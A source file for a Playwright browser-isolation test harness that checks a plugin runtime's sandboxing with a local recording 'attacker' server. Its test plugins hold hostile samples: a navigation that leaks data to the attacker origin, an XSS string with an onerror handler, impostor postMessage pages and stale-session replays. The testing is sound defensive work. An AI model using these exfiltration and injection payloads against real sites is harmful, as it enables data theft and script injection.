// Browser isolation harness for the Studio plugin runtime (Playwright webServer).
//
// Four servers emulate the deployment on one machine:
//   app      http://localhost:4310   trusted Scholera origin: the host page, the real host-side
//                                    code, and a stub /api/studio/bridge that records what the
//                                    host forwards
//   runtime  http://127.0.0.1:4311   dedicated plugin origin (a different site from localhost)
//   attacker http://127.0.0.1:4312   records every request and every connection that sends none
//   v9       http://127.0.0.1:4313   a runtime origin whose runtime claims bridge "v9"
//
// The frame documents are built by the real src/lib/studio/runtime/frame-document.ts, the
// runtime is the real public/studio-runtime/v1/runtime.js (or v2's, for frames under
// /studio-frame/v1/probe-v2/), and the host page runs the real
// host.ts, bridge-client.ts and preview-bridge.ts (bundled from host-entry.ts). Replaced:
// the Next.js route glue (tickets, bundle lookup, middleware) and the bridge's server side.
// The stub bridge proves what the HOST lets through; server authorization is proven by the
// Vitest and DB tests (src/__tests__/studio-bridge*.test.ts).
import { createServer } from 'node:http'
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { randomBytes } from 'node:crypto'
import { build } from 'esbuild'

const here = dirname(fileURLToPath(import.meta.url))
const repo = join(here, '..', '..')
const { frameHeaders, frameHtml } = await import('../../src/lib/studio/runtime/frame-document.ts')

export const APP = 'http://localhost:4310'
export const RUNTIME = 'http://127.0.0.1:4311'
export const ATTACKER = 'http://127.0.0.1:4312'
export const RUNTIME_V9 = 'http://127.0.0.1:4313'
const INSTALLATION = '00000000-0000-4000-8000-000000000001'
const VERSION = '00000000-0000-4000-8000-0000000000a1'
// The stub bridge answers `stale` for calls from a frame built for this version.
const STALE_VERSION = '00000000-0000-4000-8000-0000000000de'

// ── The real host-side code, bundled for the browser ──────────────────────
const hostBundle = (
  await build({
    entryPoints: [join(here, 'host-entry.ts')],
    bundle: true,
    format: 'esm',
    platform: 'browser',
    target: 'es2022',
    write: false,
    tsconfig: join(repo, 'tsconfig.json'),
    logLevel: 'error',
  })
).outputFiles[0].text

const HOST_PAGE = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Studio runtime harness</title></head>
<body><div id="mount"></div>
<script type="module" src="/host-bundle.js"></script>
<script type="module">
await new Promise((r) => (window.studio ? r() : setTimeout(r, 0)))
const { mountPluginFrame, createBridgeClient, createPreviewBridge, previewManifest } = window.studio
// Secrets the plugin must never reach.
document.cookie = 'scholera_session=host-secret; path=/'
localStorage.setItem('scholera_secret', 'host-secret')
const state = { snapshots: [], reports: [], security: [], previewCalls: [], toasts: [], frame: null }
window.harness = {
  state,
  // mode: 'custom' records requests in the page; 'bridge' uses the real bridge client
  // against the stub /api/studio/bridge; 'preview' uses the real preview bridge.
  mount(frameUrl, { mode = 'custom', limits, allowedMethods, versionId = '${VERSION}' } = {}) {
    state.snapshots = []; state.reports = []; state.security = []; state.previewCalls = []; state.toasts = []
    let handleRequest = async (method, args) => { state.reports.push({ method, args }); return { ok: true, data: { received: true } } }
    let report = () => {}
    let checkStatus
    if (mode === 'bridge') {
      const client = createBridgeClient({ installationId: '${INSTALLATION}', versionId })
      handleRequest = (m, a) => client.handleRequest(m, a)
      report = (r) => client.reportStop(r)
      checkStatus = () => client.checkStatus()
    }
    if (mode === 'preview') {
      const preview = createPreviewBridge(previewManifest, 'student')
      handleRequest = async (method, args) => {
        const result = await preview.handleRequest(method, args)
        state.previewCalls.push({ method, result })
        return result
      }
    }
    state.frame = mountPluginFrame({
      container: document.getElementById('mount'),
      frameUrl, title: 'Probe', view: 'student', limits, allowedMethods, handleRequest, checkStatus,
      onToast: (message, tone) => state.toasts.push({ message, tone }),
      onChange: (s) => state.snapshots.push(s),
      onStopped: (r) => { state.security.push(r); report(r) },
    })
  },
  snapshot: () => state.frame && state.frame.snapshot(),
  destroy: () => state.frame && state.frame.destroy(),
}
window.harnessReady = true
</script></body></html>`

// ── Test plugins ──────────────────────────────────────────────────────
const BUNDLES = {
  probe: readFileSync(join(here, 'probe-plugin.js'), 'utf8').replaceAll('__ATTACKER__', ATTACKER),
  stale: `
    parent.postMessage({ scholera: 'bridge', v: 1, type: 'request', session: '00000000-0000-4000-8000-000000000000', id: 'stale', method: 'probe.report', args: { stale: true } }, '*')
    ScholeraStudio.request('probe.report', { fresh: true })`,
  selfnav: `location.href = '${ATTACKER}/nav?leak=probe-data'`,
  crash: `setTimeout(() => { throw new Error('probe crash') }, 0)`,
  ready: `ScholeraStudio.request('probe.report', { context: ScholeraStudio.context })`,
  bridgecall: `ScholeraStudio.request('records.list', { collection: 'responses' }).then((got) => ScholeraStudio.request('test.report', { got }))`,
  oversized: `
    ScholeraStudio.request('records.create', { collection: 'responses', data: 'x'.repeat(70 * 1024) })
    setTimeout(() => ScholeraStudio.request('test.report', { after: 'oversized' }), 300)`,
  junk: `for (let i = 0; i < 25; i++) parent.postMessage({ junk: i }, '*')`,
  undeclared: `ScholeraStudio.request('context.get').catch((e) => ScholeraStudio.request('records.list', { report: e.code }))`,
  previewcall: `ScholeraStudio.request('context.get').then(() => ScholeraStudio.request('records.list', { collection: 'responses' }))`,
  ui: `(async () => {
    const big = await ScholeraStudio.request('ui.resize', { height: 5000 })
    const bad = await ScholeraStudio.request('ui.resize', { height: -5 }).catch((e) => e.code)
    await ScholeraStudio.request('ui.toast', { message: '<img src=x onerror=alert(1)>' })
    const long = await ScholeraStudio.request('ui.toast', { message: 'x'.repeat(500) }).catch((e) => e.code)
    await ScholeraStudio.request('records.list', { report: { big, bad, long } })
  })()`,
  // Step 5B: a plugin that never calls the bridge, and one that writes after a pause.
  silent: `document.body.setAttribute('data-ran', 'yes')`,
  latewrite: `setTimeout(() => ScholeraStudio.request('records.create', { collection: 'responses', data: {} })
    .then(() => ScholeraStudio.request('test.report', { wrote: true }), (e) => ScholeraStudio.request('test.report', { code: e.code })), 1500)`,
  stalecall: `ScholeraStudio.request('records.list', { collection: 'responses' }).catch((first) =>
    ScholeraStudio.request('records.list', { collection: 'responses' }).catch((second) =>
      document.body.setAttribute('data-codes', first.code + ',' + second.code)))`,
}

function serveFrame(res, runtimeOrigin, variant, runtime) {
  const bundle = BUNDLES[variant]
  if (!bundle) return notFound(res)
  const input = { appOrigin: APP, runtimeOrigin, nonce: randomBytes(18).toString('base64'), bundle, title: `Probe ${variant}`, runtime }
  res.writeHead(200, frameHeaders(input))
  res.end(frameHtml(input))
}

const runtimeJs = (version) =>
  readFileSync(join(repo, 'public/studio-runtime/v1/runtime.js'), 'utf8').replace("var RUNTIME = 'v1'", `var RUNTIME = '${version}'`)

function notFound(res) {
  res.writeHead(404, { 'Content-Type': 'text/plain' })
  res.end('Not found')
}

// A page on any origin that tries to talk to the host as if it were the plugin frame.
const IMPOSTOR = `<!doctype html><html><body><script>
  const got = []
  addEventListener('message', (e) => got.push(e.data))
  const target = window.opener || window.parent
  const session = decodeURIComponent(location.hash.slice(1)) || '00000000-0000-4000-8000-000000000000'
  target.postMessage({ scholera: 'bridge', v: 1, type: 'hello', runtime: 'v1' }, '*')
  target.postMessage({ scholera: 'bridge', v: 1, type: 'request', session, id: 'impostor', method: 'probe.report', args: { impostor: true } }, '*')
  setTimeout(() => { document.body.dataset.got = JSON.stringify(got); document.body.dataset.done = '1' }, 600)
</script></body></html>`

function runtimeServer(origin, version) {
  return createServer((req, res) => {
    const url = new URL(req.url, origin)
    if (url.pathname === '/studio-runtime/v1/runtime.js') {
      res.writeHead(200, { 'Content-Type': 'text/javascript; charset=utf-8', 'Cache-Control': 'no-store' })
      return res.end(runtimeJs(version))
    }
    // The pinned vendor file and kit stylesheet the frame document also loads (Step 6), and
    // bridge v2's files, all served as they are.
    if (/^\/studio-runtime\/(v1\/(vendor\.js|kit\.css)|v2\/(runtime\.js|vendor\.js|kit\.css))$/.test(url.pathname)) {
      const css = url.pathname.endsWith('.css')
      res.writeHead(200, { 'Content-Type': css ? 'text/css; charset=utf-8' : 'text/javascript; charset=utf-8', 'Cache-Control': 'no-store' })
      return res.end(readFileSync(join(repo, 'public', url.pathname)))
    }
    const frame = /^\/studio-frame\/v1\/(probe|probe-v2)\/([a-z]+)$/.exec(url.pathname)
    if (frame) return serveFrame(res, origin, frame[2], frame[1] === 'probe-v2' ? 'v2' : 'v1')
    if (url.pathname === '/impostor.html') {
      res.writeHead(200, { 'Content-Type': 'text/html' })
      return res.end(IMPOSTOR)
    }
    if (url.pathname === '/hang') return // never answers: start-timeout test
    notFound(res)
  })
}

// ── The attacker: what actually left the browser ───────────────────
const log = { requests: [], connections: [] }
const attacker = createServer((req, res) => {
  const url = new URL(req.url, ATTACKER)
  // Counted for every request, the test's own included, so only a connection that
  // never sent anything (a preconnect) counts as idle.
  if (req.socket.__entry) req.socket.__entry.requests += 1
  if (url.pathname === '/__log') {
    res.writeHead(200, { 'Content-Type': 'application/json' })
    return res.end(JSON.stringify({
      requests: log.requests,
      idleConnections: log.connections.filter((c) => c.requests === 0).length,
    }))
  }
  if (url.pathname === '/__reset') {
    log.requests = []
    // Connections opened before the reset no longer count, idle or not.
    log.connections = []
    res.writeHead(204)
    return res.end()
  }
  log.requests.push({ path: url.pathname + url.search, cookie: Boolean(req.headers.cookie) })
  if (url.pathname === '/framer.html') {
    // Frames a plugin frame document from a site that isn't Scholera.
    res.writeHead(200, { 'Content-Type': 'text/html' })
    return res.end(`<!doctype html><html><body><iframe src="${url.searchParams.get('src')}"></iframe><script>
      addEventListener('message', (e) => { document.body.dataset.hello = JSON.stringify(e.data) })
    </script></body></html>`)
  }
  res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' })
  res.end('leaked')
})
attacker.on('connection', (socket) => {
  const entry = { requests: 0, open: true }
  socket.__entry = entry
  log.connections.push(entry)
  socket.on('close', () => (entry.open = false))
})
attacker.on('upgrade', (req, socket) => {
  log.requests.push({ path: new URL(req.url, ATTACKER).pathname + ' (websocket)', cookie: Boolean(req.headers.cookie) })
  socket.destroy()
})

// ── The app origin, with a stub bridge that records what the host forwarded ──
let bridgeLog = []
// What the stub bridge says about this viewer's access (Step 5B): 'available', 'readOnly'
// or 'unavailable'. Calls get `unavailable` when it is; the heartbeat gets it as status.
let access = 'available'
const app = createServer((req, res) => {
  const url = new URL(req.url, APP)
  if (url.pathname === '/health') return res.end('ok')
  if (url.pathname === '/host.html') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
    return res.end(HOST_PAGE)
  }
  if (url.pathname === '/host-bundle.js') {
    res.writeHead(200, { 'Content-Type': 'text/javascript; charset=utf-8' })
    return res.end(hostBundle)
  }
  if (url.pathname === '/__bridge-log') {
    res.writeHead(200, { 'Content-Type': 'application/json' })
    return res.end(JSON.stringify(bridgeLog))
  }
  if (url.pathname === '/__bridge-access') {
    access = url.searchParams.get('to') ?? 'available'
    res.writeHead(204)
    return res.end()
  }
  if (url.pathname === '/__bridge-reset') {
    bridgeLog = []
    access = 'available'
    res.writeHead(204)
    return res.end()
  }
  if (url.pathname === '/api/studio/bridge' && req.method === 'POST') {
    let body = ''
    req.on('data', (c) => (body += c))
    req.on('end', () => {
      const parsed = JSON.parse(body)
      bridgeLog.push({ body: parsed, origin: req.headers.origin ?? null, contentType: req.headers['content-type'] ?? null })
      res.writeHead(200, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' })
      const stale = parsed.type === 'call' && parsed.expectedVersionId === STALE_VERSION
      res.end(JSON.stringify(
        parsed.type === 'status' ? { ok: true, data: { status: access } }
        : parsed.type === 'call' && access === 'unavailable' ? { ok: false, error: { code: 'unavailable', message: 'This tool isn’t available right now.' } }
        : stale ? { ok: false, error: { code: 'stale', message: 'A newer version of this tool is in use.' } }
        : parsed.type === 'call' ? { ok: true, data: { echo: parsed.method, args: parsed.args } }
        : { ok: true, data: null },
      ))
    })
    return
  }
  notFound(res)
})

app.listen(4310)
runtimeServer(RUNTIME, 'v1').listen(4311, '127.0.0.1')
attacker.listen(4312, '127.0.0.1')
runtimeServer(RUNTIME_V9, 'v9').listen(4313, '127.0.0.1')
console.log('studio runtime harness ready')
